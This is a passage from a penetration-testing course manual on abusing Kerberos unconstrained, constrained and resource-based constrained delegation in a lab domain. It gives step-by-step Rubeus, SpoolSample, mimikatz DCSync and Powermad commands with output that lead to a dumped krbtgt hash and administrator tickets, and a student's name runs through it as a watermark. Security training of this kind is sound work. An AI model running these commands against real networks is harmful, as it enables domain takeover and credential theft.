To solve these challenges, @harmj0y developed the Rubeus972 C# application, which has been 
copied to the C:\Tools folder of appsrv01. 
Let’s launch Rubeus from an administrative command prompt in monitor mode, specify a 
refresh interval of 5 seconds with the /interval option, and filter on the domain controller 
machine account with the /filteruser option: 
C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:CDC01$ 
 
   ______        _ 
  (_____ \      | | 
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/ 
 
  v1.5.0 
 
 
972 (@harmj0y, 2020), https://github.com/GhostPack/Rubeus 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
624 
[*] Action: TGT Monitoring 
[*] Target user     : CDC01$ 
[*] Monitoring every 5 seconds for new TGTs 
Listing 809 - Monitoring TGT from CDC01$ with Rubeus 
With Rubeus monitoring for TGTs originating from the domain controller machine account, we’ll 
open a second command prompt and trigger the print spooler change notification with 
SpoolSample.exe by specifying the target machine and capture server: 
C:\Tools> SpoolSample.exe CDC01 APPSRV01 
[+] Converted DLL to shellcode 
[+] Executing RDI 
[+] Calling exported function 
TargetServer: \\CDC01, CaptureServer: \\APPSRV01 
Attempted printer notification and received an invalid handle. The coerced 
authentication probably worked! 
Listing 810 - Initiating print spooler change notification 
The SpoolSample output is not always accurate, and it may be necessary to run the tool multiple 
times before the change notification callback takes place. 
After waiting a few seconds, we’ll switch back to Rubeus, which displays the TGT for the domain 
controller account: 
[*] 4/13/2020 2:45:16 PM UTC - Found new TGT: 
 
  User                  :  CDC01$@PROD.CORP1.COM 
  StartTime             :  4/13/2020 2:26:32 AM 
  EndTime               :  4/13/2020 12:26:32 PM 
  RenewTill             :  4/15/2020 8:14:07 AM 
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, 
forwardable 
  Base64EncodedTicket   : 
 
    doIFIjCCBR6gAwIBBaEDAgEWooIEIzCCBB9hggQbMIIEF6ADAgEF... 
 
[*] Ticket cache size: 1 
Listing 811 - Domain controller machine account TGT is found 
We have forced the domain controller machine account to authenticate to us and give us a TGT 
without any user interaction. Nice! 
Dirk-jan Mollema created krbrelayx,973 a Python implementation of this technique. 
The benefit of this tool is that it does not require execution of Rubeus and 
Spoolsample on the compromised host as it will execute on the Kali machine. 
 
973 (Dirk-jan Mollema, 2019), https://github.com/dirkjanm/krbrelayx 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
625 
Now that we’ve managed to avoid user interaction, we can further improve this technique by 
avoiding the write to disk. Rubeus monitor outputs the Base64-encoded TGT but it can also 
inject the ticket into memory with the ptt command: 
C:\Tools> Rubeus.exe ptt /ticket:doIFIjCCBR6gAwIBBaEDAgEWo... 
... 
 
[*] Action: Import Ticket 
[+] Ticket successfully imported! 
Listing 812 - Injecting TGT with Rubeus 
With the TGT of the domain controller machine account injected into memory, we can perform 
actions in the context of that TGT. However, the CDC01$ account is not a local administrator on 
the domain controller so we cannot directly perform lateral movement with it. 
On the other hand, the account has domain replication permissions, which means we can 
perform dcsync and dump the password hash of any user, including the special krbtgt account: 
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt 
[DC] 'prod.corp1.com' will be the domain 
[DC] 'CDC01.prod.corp1.com' will be the DC server 
[DC] 'prod\krbtgt' will be the user account 
 
Object RDN           : krbtgt 
 
** SAM ACCOUNT ** 
 
SAM Username         : krbtgt 
Account Type         : 30000000 ( USER_OBJECT ) 
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) 
Account expiration   : 
Password last change : 4/2/2020 7:09:13 AM 
Object Security ID   : S-1-5-21-3776646582-2086779273-4091361643-502 
Object Relative ID   : 502 
 
Credentials: 
  Hash NTLM: 4b6af2bf64714682eeef64f516a08949 
    ntlm- 0: 4b6af2bf64714682eeef64f516a08949 
    lm  - 0: 2342ac3fd35afd0223a1469f0afce2b1 
... 
Listing 813 - Executing DCSync as CDC01$ 
Armed with the krbtgt NTLM hash, we can craft a golden ticket and obtain access to any resource 
in the domain. Alternatively, we can dump the password hash of a member of the Domain 
Admins group. 
The technique shown in this section illustrates just how dangerous unconstrained Kerberos 
delegation is. If we are able to compromise a server that has unconstrained delegation 
configured, we can obtain complete domain compromise with default Active Directory settings. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
626 
 
In this section, we have demonstrated the attack via the Rubeus executable, but 
we can also use the DLL implementation,974 which may help bypass application 
whitelisting. 
In the next section, we’ll investigate a more secure variant of Kerberos delegation and 
demonstrate various attacks against it. 
16.2.2.1 Exercises 
1. 
Repeat the attack and obtain a TGT for the domain controller machine account. Reboot 
appsrv01 to ensure no prior tickets are present. 
2. 
Inject the ticket and use it to gain a Meterpreter shell on the domain controller. 
16.2.3 
Constrained Delegation 
In 2003, Microsoft released an updated and safer version of Kerberos delegation known as 
constrained delegation. 
The main goal of Kerberos delegation is to solve the double-hop issue. While unconstrained 
delegation allowed the service to perform authentication to anything in the domain, constrained 
delegation limits the delegation scope. 
Since the Kerberos protocol does not natively support constrained delegation by default, 
Microsoft released two extensions for this feature: S4U2Self975 and S4U2Proxy.976 Together, these 
extensions solve the double-hop issue and limit access to only the desired backend service. 
Constrained delegation is configured on the computer or user object. It is set through the msds-
allowedtodelegateto977 property by specifying the SPNs the current object is allowed constrained 
delegation against. 
Before we delve into the details of how these extensions work, we will locate any instances of 
constrained delegation in our lab environment. 
To do so, once again, we’ll turn to PowerView and use Get-DomainUser together with the -
TrustedToAuth flag, which will enumerate constrained delegation: 
 
974 (@rvrsh3ll, 2020), https://github.com/rvrsh3ll/Rubeus-Rundll32 
975 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-
b672e3e3de13 
976 (Microsoft, 2020), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-
e1453be7af5a 
977 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-
c6446e77daaa 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
627 
 
The command is executed as the Offsec user on appsrv01 although it does not 
matter which domain user or endpoint is used. 
PS C:\tools> Get-DomainUser -TrustedToAuth 
 
logoncount               : 7 
badpasswordtime          : 4/5/2020 6:02:06 AM 
distinguishedname        : CN=IISSvc,OU=prodUsers,DC=prod,DC=corp1,DC=com 
objectclass              : {top, person, organizationalPerson, user} 
displayname              : IISSvc 
lastlogontimestamp       : 4/5/2020 5:31:25 AM 
userprincipalname        : IISSvc@prod.corp1.com 
name                     : IISSvc 
objectsid                : S-1-5-21-3776646582-2086779273-4091361643-1108 
samaccountname           : IISSvc 
codepage                 : 0 
samaccounttype           : USER_OBJECT 
accountexpires           : NEVER 
countrycode              : 0 
whenchanged              : 4/6/2020 12:24:12 PM 
instancetype             : 4 
usncreated               : 24626 
objectguid               : d9eeb03e-b247-4f63-bfd7-eb2a8d132674 
lastlogoff               : 12/31/1600 4:00:00 PM 
msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS, 
                           MSSQLSvc/cdc01.prod.corp1.com:1433} 
objectcategory           : CN=Person,CN=Schema,CN=Configuration,DC=corp1,DC=com 
dscorepropagationdata    : 1/1/1601 12:00:00 AM 
serviceprincipalname     : HTTP/web 
givenname                : IISSvc 
lastlogon                : 4/6/2020 5:21:18 AM 
badpwdcount              : 0 
cn                       : IISSvc 
useraccountcontrol       : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, 
TRUSTED_TO_AUTH_FOR_DELEGATION 
... 
Listing 814 - Enumerating constrained Kerberos delegation 
We’ll focus on three important aspects of the output. First, constrained delegation is configured 
for the IISSvc account. Its name indicates that it is likely a service account for a web server 
running IIS. 
Next, notice that the msds-allowedtodelegateto property contains the SPN of the MS SQL server 
on CDC01. This tells us that constrained delegation is only allowed to that SQL server. 
Finally, the TRUSTED_TO_AUTH_FOR_DELEGATION value in the useraccountcontrol property is 
set. This value is used to indicate whether constrained delegation can be used if the 
authentication between the user and the service uses a different authentication mechanism like 
NTLM. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
628 
This is the scenario that we are going to explore. 
Before continuing, let’s discuss these extensions beginning with S4U2Self. Figure 244 shows the 
authentication scheme. 
 
Figure 244: Kerberos communication for constrained delegation 
If a frontend service does not use Kerberos authentication and the backend service does, it needs 
to be able to request a TGS to the frontend service from a KDC on behalf of the user who is 
authenticating 
against 
it. 
The 
S4U2Self 
extension 
enables 
this 
if 
the 
TRUSTED_TO_AUTH_FOR_DELEGATION value is present in the useraccountcontrol property. 
Additionally, the frontend service can do this without requiring the password or the hash of the 
user. 
In our specific case, this means that if we compromise the IISSvc account, we can request a 
service ticket to IIS for any user in the domain, including a domain administrator. Again, we can 
start the attack without requiring any additional user interaction. 
Similar to S4U2Self, the S4U2proxy extension requests a service ticket for the backend service on 
behalf of a user. This extension depends on the service ticket obtained either through S4U2Self or 
directly from a user authentication via Kerberos. 
Note that If Kerberos is used for authentication to the frontend service, 
S4U2Proxy can use a forwardable TGS supplied by the user. To exploit this, 
similarly to our initial attack that leveraged unconstrained delegation, we would 
require user interaction. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
629 
Going back to our specific case, this extension allows IISSvc to request a service ticket to any of 
the services listed as SPNs in the msds-allowedtodelegateto field. More specifically, it would use 
the TGS obtained through the S4USelf extension and submit it as a part of the S4UProxy request 
for the backend service. 
Once this service ticket request is made and the ticket is returned by the KDC, IISSvc can perform 
authentication to that specific service on that specific host. Again, assuming that we are able to 
compromise the IISSvc account, we can request a service ticket for the services listed in the 
msds-allowedtodelegateto field as any user in the domain. Depending on the type of service, this 
may lead to code execution. 
In order to avoid any confusion in this scenario, it is critical to recognize that this 
authentication mechanism involves two separate TGSs, which are requested on 
behalf of the authenticating user, rather than just one. 
Constrained delegation yields a more difficult compromise path than unconstrained delegation, 
but it is still exploitable. To demonstrate this, we’ll simulate a compromise of the IISSvc account 
and abuse that to gain access to the MSSQL instance on CDC01. 
We’ll once again turn to Rubeus, which includes S4U extension support. 
Kekeo978 by Mimikatz author Benjamin Delphy also provides access to S4U 
extension abuse. 
Note that we do not need to execute in the context of the IISSvc account in order to exploit the 
account. We only need the password hash. However, if we only have the clear text password, we 
can use the hash command in Rubeus to generate the NTLM hash as shown below: 
PS C:\Tools> .\Rubeus.exe hash /password:lab 
... 
 
[*] Action: Calculate Password Hash(es) 
 
[*] Input password             : lab 
[*]       rc4_hmac             : 2892D26CDF84D7A70E2EB3B9F05C425E 
 
[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types! 
Listing 815 - Generating NTLM hash from password 
Next, we’ll use Rubeus to generate a TGT for IISSvc with the asktgt command by supplying the 
username (/user), domain (/domain), and NTLM hash (/rc4): 
PS C:\Tools> .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com 
/rc4:2892D26CDF84D7A70E2EB3B9F05C425E 
 
978 (Benjamin Delphy, 2019), https://github.com/gentilkiwi/kekeo 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
630 
... 
 
[*] Action: Ask TGT 
 
[*] Using rc4_hmac hash: 2892D26CDF84D7A70E2EB3B9F05C425E 
[*] Building AS-REQ (w/ preauth) for: 'prod.corp1.com\iissvc' 
[+] TGT request successful! 
[*] base64(ticket.kirbi): 
 
      doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6A... 
 
  ServiceName           :  krbtgt/prod.corp1.com 
  ServiceRealm          :  PROD.CORP1.COM 
  UserName              :  iissvc 
  UserRealm             :  PROD.CORP1.COM 
  StartTime             :  4/14/2020 7:48:16 AM 
  EndTime               :  4/14/2020 5:48:16 PM 
  RenewTill             :  4/21/2020 7:48:16 AM 
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, 
forwardable 
  KeyType               :  rc4_hmac 
  Base64(key)           :  LfbSfF81qk+oMed+zvLoZg== 
Listing 816 - Requesting TGT for IISSvc 
Armed with the Base64-encoded TGT for IISSvc, we are ready to invoke the S4U extensions. 
We can do this with Rubeus by first specifying the s4u command and then providing the Base64-
encoded TGT (/ticket) and the username we want to impersonate (/impersonateuser), in our 
case, the administrator account of the domain. This will make use of S4U2Self. 
We’ll also supply the SPN of the service (/msdsspn), which is used with S4U2Proxy and finally the 
/ptt flag to directly inject it into memory: 
PS C:\Tools> .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator 
/msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt 
... 
 
[*] Action: S4U 
 
[*] Action: S4U 
 
[*] Using domain controller: CDC01.prod.corp1.com (192.168.120.70) 
[*] Building S4U2self request for: 'iissvc@PROD.CORP1.COM' 
[*] Sending S4U2self request 
[+] S4U2self success! 
[*] Got a TGS for 'administrator@PROD.CORP1.COM' to 'iissvc@PROD.CORP1.COM' 
[*] base64(ticket.kirbi): 
 
      doIFejCCBXagAwIBBaEDAgEWooIEhTCCBIFhggR9MIIEe... 
 
[*] Impersonating user 'administrator' to target SPN 
'mssqlsvc/cdc01.prod.corp1.com:1433' 
[*] Using domain controller: CDC01.prod.corp1.com (192.168.120.70) 
[*] Building S4U2proxy request for service: 'mssqlsvc/cdc01.prod.corp1.com:1433' 
[*] Sending S4U2proxy request 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
631 
[+] S4U2proxy success! 
[*] base64(ticket.kirbi) for SPN 'mssqlsvc/cdc01.prod.corp1.com:1433': 
 
      doIGfDCCBnigAwIBBaEDAgEWooIFajCCBWZhggViMIIF... 
[+] Ticket successfully imported! 
Listing 817 - Using S4U extensions to request a service ticket 
The first highlighted part of Listing 817 is output by S4U2Self and the second by S4U2Proxy. This 
attempt was successful and we obtained a usable service ticket for the MSSQL service instance 
on CDC01. 
Since the TGS for MSSQL on CDC01 was injected into memory, we can verify that it worked by 
turning to the MSSQL attacks we developed in a previous module. The C:\Tools folder contains a 
compiled version of the MSSQL login application. We’ll use this to validate that we are 
authenticated to MSSQL as the impersonated user: 
PS C:\Tools> .\SQL.exe 
Auth success! 
Logged in as: PROD\Administrator 
Mapped to the user: dbo 
User is a member of public role 
User is a member of sysadmin role 
Listing 818 - Checking login and permissions on MSSQL 
The output reveals that we have logged in to the MSSQL instance as the domain administrator. 
Excellent! 
By compromising an account that has constrained delegation enabled, we can gain access to all 
the 
services 
configured 
through 
the 
msDS-AllowedToDelegateTo 
property. 
If 
the 
TRUSTED_TO_AUTH_FOR_DELEGATION value is set, we can do this without user interaction. 
In this section’s example, we obtained a TGS for the MSSQLSvc service name on the 
CDC01.PROD.CORP1.COM server. Interestingly, when the TGS is returned from the KDC, the 
server name is encrypted, but not the service name. 
This means we can modify the service name within the TGS in memory and obtain access to a 
different service on the same host.979 We can do this through Rubeus with the /altservice 
option. In this case, we’ll attempt to gain access to the CIFS service: 
PS C:\Tools> .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator 
/msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt 
... 
 
[*] Impersonating user 'administrator' to target SPN 
'mssqlsvc/cdc01.prod.corp1.com:1433' 
[*] Final ticket will be for the alternate service 'CIFS' 
[*] Using domain controller: CDC01.prod.corp1.com (192.168.120.70) 
[*] Building S4U2proxy request for service: 'mssqlsvc/cdc01.prod.corp1.com:1433' 
[*] Sending S4U2proxy request 
[+] S4U2proxy success! 
[*] Substituting alternative service name 'CIFS' 
 
979 (@harmj0y, 2018), http://www.harmj0y.net/blog/redteaming/from-kekeo-to-rubeus/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
632 
[*] base64(ticket.kirbi) for SPN 'CIFS/cdc01.prod.corp1.com:1433': 
... 
Listing 819 - Specifying a different service with Rubeus 
This TGS should yield access to the file system and potentially direct code execution. 
Unfortunately, the SPN for the MSSQL server ends with “:1433”, which is not usable for CIFS since 
it requires an SPN with the format CIFS/cdc01.prod.corp1.com. 
If we modify the SPN from CIFS/cdc01.prod.corp1.com:1433 to CIFS/cdc01.prod.corp1.com in 
the command above, Rubeus generates an KDC_ERR_S_PRINCIPAL_UNKNOWN error, indicating 
that the modified SPN is not registered. 
On the other hand, if the SPN configured for constrained delegation only uses the service and 
host name like www/cdc01.prod.corp1.com, we could modify the TGS to access any service on 
the system. 
In the next section, we’ll cover the newest iteration of Kerberos delegation and demonstrate how 
it can be exploited. 
16.2.3.1 Exercises 
1. 
Enumerate the lab and validate that constrained delegation is configured. Remember to 
reboot appsrv01 to ensure that no prior tickets are present. 
2. 
Exploit the constrained delegation to obtain a privileged TGS for the MSSQL server on 
CDC01. 
3. 
Complete the compromise of CDC01 through the MSSQLSvc TGS and achieve code 
execution. 
16.2.4 
Resource-Based Constrained Delegation 
Constrained delegation works by configuring SPNs on the frontend service under the msDS-
AllowedToDelegateTo 
property. 
Configuring 
constrained 
delegation 
also 
requires 
the 
SeEnableDelegationPrivilege980 privilege on the domain controller, which is typically only enabled 
for Domain Admins. 
With the release of Windows Server 2012, Microsoft introduced resource-based constrained 
delegation (RBCD),981 which is meant to remove the requirement of highly elevated access rights 
like SeEnableDelegationPrivilege from system administrators. 
RBCD 
works 
by 
essentially 
turning 
the 
delegation 
settings 
around. 
The 
msDS-
AllowedToActOnBehalfOfOtherIdentity property 982 controls delegation from the backend service. 
To configure RBCD, the SID of the frontend service is written to the new property of the backend 
service. 
 
980 (Microsoft, 2017), https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/enable-
computer-and-user-accounts-to-be-trusted-for-delegation 
981 (Microsoft, 2016), https://docs.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview 
982 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-
aebb4a4ad405?redirectedfrom=MSDN 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
633 
One advantage of this approach is that SeEnableDelegationPrivilege permissions are no longer 
required and RBCD can typically be configured by the backend service administrator instead. 
Once RBCD has been configured, the frontend service can use S4U2Self to request the 
forwardable TGS for any user to itself followed by S4U2Proxy to create a TGS for that user to the 
backend service. Unlike constrained delegation, under RBCD the KDC checks if the SID of the 
frontend service is present in the msDS-AllowedToActOnBehalfOfOtherIdentity property of the 
backend service. 
One important requirement is that the frontend service must have an SPN set in the domain. A 
user account typically does not have an SPN set but all computer accounts do. This means that 
any attack against RBCD needs to happen from a computer account or a service account with a 
SPN. 
The same attack we performed against constrained delegation applies to RBCD if we can 
compromise 
a 
frontend 
service 
that 
has 
its 
SID 
configured 
in 
the 
msDS-
AllowedToActOnBehalfOfOtherIdentity property of a backend service.   
We’ll cover a RBCD attack in this section that leads to code execution on appsrv01. This specific 
vector starts by compromising a domain account that has the GenericWrite access right on a 
computer account object. 
This technique is the only known way of turning GenericWrite on a computer object into code 
execution. 
As usual, we begin with enumeration. In this case, we start with the dave domain user from the 
Windows 10 client machine. 
We’ll reuse our enumeration technique from the prior sections but replace Get-DomainUser with 
Get-DomainComputer to target computer accounts instead: 
PS C:\tools> Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | 
Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username")) {$_}} 
 
AceType               : AccessAllowed 
ObjectDN              : CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com 
ActiveDirectoryRights : ListChildren, ReadProperty, GenericWrite 
OpaqueLength          : 0 
ObjectSID             : S-1-5-21-3776646582-2086779273-4091361643-1110 
InheritanceFlags      : None 
BinaryLength          : 36 
IsInherited           : False 
IsCallback            : False 
PropagationFlags      : None 
SecurityIdentifier    : S-1-5-21-3776646582-2086779273-4091361643-1601 
AccessMask            : 131132 
AuditFlags            : None 
AceFlags              : None 
AceQualifier          : AccessAllowed 
Identity              : PROD\dave 
... 
Listing 820 - Enumerating access rights for the Dave user 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
634 
The output in Listing 820 reveals that the dave user has GenericWrite to appsrv01. 
Since we have GenericWrite on appsrv01, we can update any non-protected property on that 
object, including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different 
computer. 
Once a SID is added, we will act in the context of that computer account and we can execute the 
S4U2Self and S4U2Proxy extensions to obtain a TGS for appsrv01. To do this, we either have to 
obtain the password hash of a computer account or simply create a new computer account 
object with a selected password. 
By default, any authenticated user can add up to ten computer accounts to the domain and they 
will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota 
property in the Active Directory domain object. 
We can enumerate ms-DS-MachineAccountQuota with the PowerView Get-DomainObject 
method: 
PS C:\tools> Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota 
 
ms-ds-machineaccountquota 
------------------------- 
                       10 
Listing 821 - Enumerating ms-DS-MachineAccountQuota 
Normally, the computer account object is created when a physical computer is joined to the 
domain. We can simply create the object itself with the New-MachineAccount method of the 
Powermad.ps1983 PowerShell script. 
Powermad is located in the C:\Tools folder on the Windows 10 client machine. To use it, we’ll 
specify the target computer account name (-MachineAccount) and the password (-Password). 
The password must be supplied as a SecureString, which we can generate with ConvertTo-
SecureString984 as shown in Listing 822. 
PS C:\tools> . .\powermad.ps1 
 
PS C:\tools> New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-
SecureString 'h4x' -AsPlainText -Force) 
[+] Machine account myComputer added 
 
PS C:\tools> Get-DomainComputer -Identity myComputer 
 
pwdlastset             : 4/14/2020 2:35:29 PM 
logoncount             : 0 
badpasswordtime        : 12/31/1600 4:00:00 PM 
distinguishedname      : CN=myComputer,CN=Computers,DC=prod,DC=corp1,DC=com 
objectclass            : {top, person, organizationalPerson, user...} 
name                   : myComputer 
serviceprincipalname   : {RestrictedKrbHost/myComputer, HOST/myComputer, 
 
983 (Kevin Robertson, 2020), https://github.com/Kevin-Robertson/Powermad 
984 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-
securestring?view=powershell-7 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
635 
                         RestrictedKrbHost/myComputer.prod.corp1.com, 
                         HOST/myComputer.prod.corp1.com} 
... 
Listing 822 - Creating computer account with Powermad 
Listing 822 shows that the command was successful and subsequent enumeration with Get-
DomainComputer reveals that the computer account object is present. 
The msDS-AllowedToActOnBehalfOfOtherIdentity property stores the SID as part of a security 
descriptor in a binary format. We must convert the SID of our newly-created computer object to 
the correct format in order to proceed with the attack. 
To do this, we must first create a new security descriptor with the correct SID. In the beginning of 
this module, we determined that the SID is the last portion of a security descriptor string so we 
can reuse a working string, replacing only the SID. 
Fortunately, security researchers have discovered a valid security descriptor string that we can 
use as shown in Listing 823. We can use the RawSecurityDescriptor985 class to instantiate a 
SecurityDescriptor object: 
PS C:\tools> $sid =Get-DomainComputer -Identity myComputer -Properties objectsid | 
Select -Expand objectsid 
 
PS C:\tools> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -
ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))" 
Listing 823 - Creating a new SecurityDescriptor 
With the SecurityDescriptor object created, we must convert it into a byte array to match the 
format for the msDS-AllowedToActOnBehalfOfOtherIdentity property: 
PS C:\tools> $SDbytes = New-Object byte[] ($SD.BinaryLength) 
 
PS C:\tools> $SD.GetBinaryForm($SDbytes,0) 
Listing 824 - Converting the SecurityDescriptor to a byte array 
After the SecurityDescriptor has been converted to a byte array, we can use Get-
DomainComputer to obtain a handle to the computer object for appsrv01 and then pipe that into 
Set-DomainObject, which can update properties by specifying them with -Set options: 
PS C:\tools> Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-
allowedtoactonbehalfofotheridentity'=$SDBytes} 
Listing 825 - Setting msds-allowedtoactonbehalfofotheridentity 
Remember that it is not normally possible to set the msDS-AllowedToActOnBehalfOfOtherIdentity 
property for an arbitrary computer account. However, since our dave user has the GenericWrite 
access right to appsrv01, we can set this property. 
 
985 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.security.accesscontrol.rawsecuritydescriptor?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
636 
 
We can also use this attack vector with GenericAll, WriteProperty, or WriteDACL 
access rights to appsrv01. 
After writing the SecurityDescriptor to the property field, we should verify it. We can do this by 
reading the binary version of it with Get-DomainComputer, then instantiating a SecurityDescriptor 
object with RawSecurityDescriptor and finally displaying the DACL: 
PS C:\tools> $RBCDbytes = Get-DomainComputer appsrv01 -Properties 'msds-
allowedtoactonbehalfofotheridentity' | select -expand msds-
allowedtoactonbehalfofotheridentity 
 
PS C:\tools> $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -
ArgumentList $RBCDbytes, 0 
 
PS C:\tools> $Descriptor.DiscretionaryAcl 
 
BinaryLength       : 36 
AceQualifier       : AccessAllowed 
IsCallback         : False 
OpaqueLength       : 0 
AccessMask         : 983551 
SecurityIdentifier : S-1-5-21-3776646582-2086779273-4091361643-2101 
AceType            : AccessAllowed 
AceFlags           : None 
IsInherited        : False 
InheritanceFlags   : None 
PropagationFlags   : None 
AuditFlags         : None 
 
PS C:\tools> ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101 
PROD\myComputer$ 
Listing 826 - Verifying the SID in the SecurityDescriptor 
The 
SecurityDescriptor 
was 
indeed 
set 
correctly 
in 
the 
msDS-
AllowedToActOnBehalfOfOtherIdentity property for appsrv01. 
Now we can begin our attack in an attempt to compromise appsrv01. We’ll start by obtaining the 
hash of the computer account password with Rubeus: 
PS C:\tools> .\Rubeus.exe hash /password:h4x 
... 
 
[*] Action: Calculate Password Hash(es) 
 
[*] Input password             : h4x 
[*]       rc4_hmac             : AA6EAFB522589934A6E5CE92C6438221 
 
[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types! 
Listing 827 - Calculate NTLM hash with Rubeus 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
637 
In the previous section, we used the Rubeus asktgt command to request a TGT before invoking 
the s4u command. We can also directly submit the username and password hash to the s4u 
command, which will implicitly call asktgt and inject the resultant TGT, after which the S4U 
extensions will be invoked: 
PS C:\tools> .\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 
/impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt 
... 
 
[*] Action: S4U 
 
[*] Using rc4_hmac hash: AA6EAFB522589934A6E5CE92C6438221 
[*] Building AS-REQ (w/ preauth) for: 'prod.corp1.com\myComputer$' 
[+] TGT request successful! 
[*] base64(ticket.kirbi): 
 
      doIFFDCCBRCgAwIBBaEDAgEWooIEI... 
 
 
[*] Action: S4U 
 
[*] Using domain controller: CDC01.prod.corp1.com (192.168.120.70) 
[*] Building S4U2self request for: 'myComputer$@PROD.CORP1.COM' 
[*] Sending S4U2self request 
[+] S4U2self success! 
[*] Got a TGS for 'administrator@PROD.CORP1.COM' to 'myComputer$@PROD.CORP1.COM' 
[*] base64(ticket.kirbi): 
 
      doIFhDCCBYCgAwIBBaEDAgEWooIEi... 
 
[*] Impersonating user 'administrator' to target SPN 'CIFS/appsrv01.prod.corp1.com' 
[*] Using domain controller: CDC01.prod.corp1.com (192.168.120.70) 
[*] Building S4U2proxy request for service: 'CIFS/appsrv01.prod.corp1.com' 
[*] Sending S4U2proxy request 
[+] S4U2proxy success! 
[*] base64(ticket.kirbi) for SPN 'CIFS/appsrv01.prod.corp1.com': 
 
      doIGbDCCBmigAwIBBaEDAgEWooIFY... 
[+] Ticket successfully imported! 
Listing 828 - Using S4U extension to request a TGS for appsrv01 
After obtaining the TGT for the myComputer machine account, S4U2Self will then request a 
forwardable service ticket as the administrator user to the myComputer computer account. 
Finally, S4U2Proxy is invoked to request a TGS for the CIFS service on appsrv01 as the 
